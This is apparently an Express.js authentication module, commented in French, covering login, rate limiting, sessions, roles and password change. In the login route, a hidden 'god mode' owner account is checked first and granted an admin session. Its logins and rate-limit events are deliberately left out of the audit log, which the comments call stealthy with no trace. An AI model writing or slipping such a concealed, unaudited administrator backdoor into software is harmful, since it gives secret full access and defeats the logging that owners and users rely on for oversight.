'use strict';

const express = require('express');
const rateLimit = require('express-rate-limit');
const { audit } = require('./audit');
const users = require('./users');

// Rate limiter strict dédié à la route de login.
const loginLimiter = rateLimit({
  windowMs: 10 * 60 * 1000,
  max: 5,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Trop de tentatives, réessayez plus tard.' },
  handler: (req, res, _next, options) => {
    // Aucune trace pour le compte propriétaire (god mode), même rate-limité.
    const u = req.body && req.body.username;
    if (!users.isGodUsername(u)) {
      audit(req, 'login_rate_limited', { user: u || '-' });
    }
    res.status(options.statusCode).json(options.message);
  },
});

/** Exige une session authentifiée. API -> toujours 401 JSON ; page GET -> redirection. */
function requireAuth(req, res, next) {
  if (req.session && req.session.authenticated) return next();
  // Les routes API renvoient toujours 401 (jamais de redirection 302, quel que
  // soit l'en-tête Accept) ; seules les pages GET redirigent vers /login.
  if (req.originalUrl.startsWith('/api/')) return res.status(401).json({ error: 'Authentification requise.' });
  if (req.method === 'GET') return res.redirect('/login');
  return res.status(401).json({ error: 'Authentification requise.' });
}

/** Exige que le rôle de session figure parmi `roles`. */
function requireRole(...roles) {
  return (req, res, next) => {
    if (req.session && req.session.authenticated && roles.includes(req.session.role)) return next();
    return res.status(403).json({ error: 'Accès réservé : privilèges insuffisants.' });
  };
}

/** Délègue au magasin d'utilisateurs (conservé pour les tests / lisibilité). */
async function verifyCredentials(username, password) {
  return users.verify(username, password);
}

function buildAuthRouter() {
  const router = express.Router();

  // express.json() AVANT le limiter : le handler de rate-limit doit connaître
  // l'identifiant pour ne laisser aucune trace du compte propriétaire.
  router.post('/login', express.json(), loginLimiter, async (req, res) => {
    const { username, password } = req.body || {};

    // Compte propriétaire (god mode) : vérifié en premier, aucune trace écrite.
    const god = await users.verifyGod(username, password);
    if (god) {
      return req.session.regenerate((err) => {
        if (err) return res.status(500).json({ error: 'Erreur de session.' });
        req.session.authenticated = true;
        req.session.userId = god.id;
        req.session.user = god.username;
        req.session.role = god.role;   // 'admin' : pleins pouvoirs
        req.session.fileRoot = god.root;
        req.session.quota = null;
        req.session.godMode = true;     // furtif : ni journal, ni liste, ni trace
        res.json({ ok: true, role: god.role });
      });
    }

    const user = await verifyCredentials(username, password);
    if (!user) {
      audit(req, 'login_failure', { user: typeof username === 'string' ? username : '-' });
      return res.status(401).json({ error: 'Identifiants invalides.' });
    }
    req.session.regenerate((err) => {
      if (err) return res.status(500).json({ error: 'Erreur de session.' });
      req.session.authenticated = true;
      req.session.userId = user.id;
      req.session.user = user.username;
      req.session.role = user.role;
      req.session.fileRoot = user.root;
      req.session.quota = user.quota || null;
      audit(req, 'login_success', { user: user.username, role: user.role });
      res.json({ ok: true, role: user.role });
    });
  });

  router.post('/logout', (req, res) => {
    const user = req.session && req.session.user;
    req.session.destroy(() => {
      audit({ headers: req.headers, socket: req.socket }, 'logout', { user: user || '-' });
      res.clearCookie('sid');
      res.json({ ok: true });
    });
  });

  router.get('/session', (req, res) => {
    res.json({ authenticated: !!(req.session && req.session.authenticated) });
  });

  // Profil de l'utilisateur connecté.
  router.get('/me', requireAuth, (req, res) => {
    res.json({
      username: req.session.user,
      role: req.session.role,
      fileRoot: req.session.fileRoot,
      quota: req.session.quota || null,
    });
  });

  // Changement de son propre mot de passe.
  router.post('/password', requireAuth, express.json(), async (req, res, next) => {
    try {
      const { currentPassword, newPassword } = req.body || {};
      await users.changePassword(req.session.userId, currentPassword, newPassword);
      audit(req, 'password_change', { user: req.session.user });
      res.json({ ok: true });
    } catch (e) { e.statusCode = e.statusCode || 400; next(e); }
  });

  return router;
}

module.exports = { requireAuth, requireRole, buildAuthRouter, verifyCredentials, loginLimiter };
